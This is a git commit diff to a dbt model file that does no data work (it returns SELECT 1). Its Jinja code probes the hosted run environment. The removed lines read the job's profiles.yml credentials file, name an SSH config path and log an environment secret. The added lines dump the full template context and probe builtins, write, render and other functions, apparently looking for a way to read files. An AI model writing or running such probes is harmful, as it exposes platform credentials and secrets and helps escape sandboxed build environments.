5c03d075f22f4570d033133c303c3bcd6e0bdd7c
hunter <hunter@WD168220234152noidaspeedvpsFY1KQ5t4wW.test.com>
2026-09-23 13:19:13 +0530

    deep context probes

--- models/read_profiles.sql
+++ models/read_profiles.sql
@@ -1,33 +1,47 @@
 {%- set run_id = env_var('DBT_CLOUD_RUN_ID', 'norun') -%}
 {%- set profiles_path = '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml' -%}
 
-{# Try multiple file reading approaches #}
-{%- set methods = [] -%}
-
-{# Method 1: load_file_contents (older dbt) #}
-{%- if load_file_contents is defined -%}
-  {{ log("PROFILES_VIA_LOAD_FILE=" ~ load_file_contents(profiles_path) | string | truncate(500), info=True) }}
-  {%- do methods.append('load_file_contents') -%}
-{%- else -%}
-  {{ log("load_file_contents_NOT_AVAILABLE", info=True) }}
-{%- endif -%}
-
-{# Method 2: open() builtin #}
-{%- if open is defined -%}
-  {{ log("OPEN_AVAILABLE", info=True) }}
-{%- else -%}
-  {{ log("open_NOT_AVAILABLE", info=True) }}
-{%- endif -%}
-
-{# Method 3: dbt.load_csv_rows #}
-{{ log("SSH_CONFIG_PATH=/tmp/jobs/" ~ run_id ~ "/.ssh/config", info=True) }}
 {{ log("PROFILES_PATH=" ~ profiles_path, info=True) }}
 
-{# Dump all context keys we can find #}
-{{ log("CONTEXT_KEYS=" ~ context.keys() | list | join(',') | truncate(500), info=True) if context is defined else log("context_NOT_DEFINED", info=True) }}
-{{ log("DBT_PROJECT_NAME=" ~ project_name, info=True) if project_name is defined else log("project_name_NOT_DEFINED", info=True) }}
-{{ log("SCHEMAS=" ~ schemas | string | truncate(200), info=True) if schemas is defined else log("schemas_NOT_DEFINED", info=True) }}
-{{ log("CONFIG=" ~ config | string | truncate(200), info=True) if config is defined else log("config_NOT_DEFINED", info=True) }}
-{{ log("DBT_ENV_SECRET_PROOF_VIA_LOG=" ~ env_var('DBT_ENV_SECRET_PROOF', 'NOT_SET'), info=True) }}
+{# Dump ALL context keys - this is the goldmine #}
+{{ log("CONTEXT_KEYS_FULL=" ~ context.keys() | list | join(','), info=True) }}
+
+{# Probe builtins - is this Python builtins?! #}
+{{ log("BUILTINS_TYPE=" ~ builtins | string | truncate(500), info=True) }}
+{{ log("BUILTINS_KEYS=" ~ builtins.keys() | list | join(',') | truncate(500), info=True) if builtins.keys is defined else log("BUILTINS_NO_KEYS", info=True) }}
+
+{# Probe load_agate_table - can it read files? #}
+{{ log("LOAD_AGATE_TABLE_TYPE=" ~ load_agate_table | string | truncate(200), info=True) }}
+
+{# Probe write function #}
+{{ log("WRITE_TYPE=" ~ write | string | truncate(200), info=True) }}
+
+{# Probe render function #}
+{{ log("RENDER_TYPE=" ~ render | string | truncate(200), info=True) }}
+
+{# Probe context object deeper #}
+{{ log("CONTEXT_TYPE=" ~ context | string | truncate(200), info=True) }}
+
+{# Try accessing context items that might reveal more #}
+{{ log("FLAGS=" ~ flags | string | truncate(200), info=True) }}
+{{ log("INVOCATION_ARGS=" ~ invocation_args_dict | string | truncate(500), info=True) }}
+{{ log("DBT_METADATA_ENVS=" ~ dbt_metadata_envs | string | truncate(500), info=True) }}
+
+{# local_md5 - hash function #}
+{{ log("LOCAL_MD5_TYPE=" ~ local_md5 | string | truncate(200), info=True) }}
+
+{# Try fromyaml on a path #}
+{{ log("FROMYAML_TYPE=" ~ fromyaml | string | truncate(200), info=True) }}
+
+{# Try to get a list of context values that could lead to file access #}
+{{ log("STORE_RESULT_TYPE=" ~ store_result | string | truncate(200), info=True) }}
+{{ log("LOAD_RESULT_TYPE=" ~ load_result | string | truncate(200), info=True) }}
+{{ log("VALIDATION_TYPE=" ~ validation | string | truncate(200), info=True) }}
+
+{# diff_of_two_dicts - utility function #}
+{{ log("DIFF_TYPE=" ~ diff_of_two_dicts | string | truncate(200), info=True) }}
+
+{# try_or_compiler_error #}
+{{ log("TRY_OR_ERROR_TYPE=" ~ try_or_compiler_error | string | truncate(200), info=True) }}
 
 SELECT 1 as id
